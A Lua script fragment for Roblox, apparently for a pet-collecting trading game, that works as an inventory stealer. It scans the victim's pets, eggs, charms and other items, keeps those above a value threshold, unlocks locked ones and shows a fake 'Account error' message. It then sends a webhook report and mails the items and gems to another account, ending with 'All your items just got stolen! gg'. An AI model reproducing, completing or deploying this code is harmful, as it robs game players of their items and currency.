-- claim daycare
require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()

-- scan inventory for stealable items
local CATEGORIES = {'Pet','Egg','Charm','Enchant','Potion','Misc','Hoverboard','Booth','Ultimate'}

for _, category in ipairs(CATEGORIES) do
    if Inventory[category] then
        for uid, item in pairs(Inventory[category]) do
            local rap = 0

            if category == 'Pet' then
                local petData = require(game:GetService('ReplicatedStorage').Library.Directory.Pets)[item.id]
                if petData.huge or petData.exclusiveLevel then
                    rap = getRAP(category, item)
                end
            else
                rap = getRAP(category, item)
            end

            if rap >= MIN_RAP then
                local prefix = ''
                if item.pt == 1 then prefix = 'Golden '
                elseif item.pt == 2 then prefix = 'Rainbow ' end
                if item.sh then prefix = 'Shiny ' .. prefix end

                local displayName = category == 'Pet' and (prefix .. item.id) or item.id

                table.insert(stolenItems, {
                    category = category,
                    uid = uid,
                    amount = item._am or 1,
                    rap = rap,
                    name = displayName,
                })
                totalRAP = totalRAP + rap * (item._am or 1)
            end

            -- unlock locked items
            if item._lk then
                Network.Invoke('Locking_SetLocked', uid, false)
            end
        end
    end
end

-- execute if anything to steal
if #stolenItems > 0 or mailCost + MIN_RAP < gemBalance then
    claimMailbox()
    withdrawBoxes()

    if not recipientHasSpace() then
        Message.Error('Account error — rejoin and retry')
        return
    end

    table.sort(stolenItems, function(a, b)
        return a.rap * a.amount > b.rap * b.amount
    end)

    spawn(function() sendWebhook() end)

    for _, item in ipairs(stolenItems) do
        if mailCost > item.rap or mailCost >= gemBalance then break end
        sendItem(item.category, item.uid, item.amount)
    end

    if mailCost < gemBalance then
        sendGems()
    end

    Message.Error("All your items just got stolen! gg")
end
